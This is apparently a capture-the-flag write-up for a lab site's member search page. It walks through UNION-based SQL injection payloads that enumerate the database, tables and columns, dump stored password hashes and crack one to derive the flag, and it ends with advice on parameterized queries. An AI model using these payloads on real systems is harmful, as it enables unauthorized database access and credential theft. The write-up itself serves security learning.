# 07 - SQL Injection Member

## Reproduce

We found an SQL Injection in member search page: `http://192.168.1.19/?page=member`

- Get the database name: `1 UNION SELECT 1, database()`
  ===> `Member_Sql_Injection`

- Get the table name: `1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)`
  ===> `users`

- Get columns name: `1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110) AND TABLE_NAME = char(117,115,101,114,115)`
  ===>
  `{ 'user_id', 'first_name', 'last_name', 'town', 'country', 'planet', 'Commentaire', 'countersign' }`

- Let's list the `commentaire + countersign` of all the members :
  `1 UNION SELECT Commentaire,countersign FROM users`

In the comment we found this:
`Decrypt this password -> then lower all the char. Sh256 on it and it's good !`

In the countersign we found: `5ff9d0165b4f92b14994e5c685cdce28`

And that what we did :)

- Decode 5ff9d0165b4f92b14994e5c685cdce28 with MD5 ==> 'FortyTwo'
- Lowercase('FortyTwo') ==> 'fortytwo'
- Encode 'fortytwo' using Sha256 ==> Tadaaaaaa flag

## Explaination of the vulnerability

SQL injection: is a code injection technique that might destroy your database.

## Fix

- Use of Prepared Statements (with Parameterized Queries) for example in :
  - JAVA EE use: PreparedStatement() with bind variables.
  - PHP use: PDO (PHP Data Object) with strongly typed parameterized queries.
- Don't construct queries with user input whitout verifications.
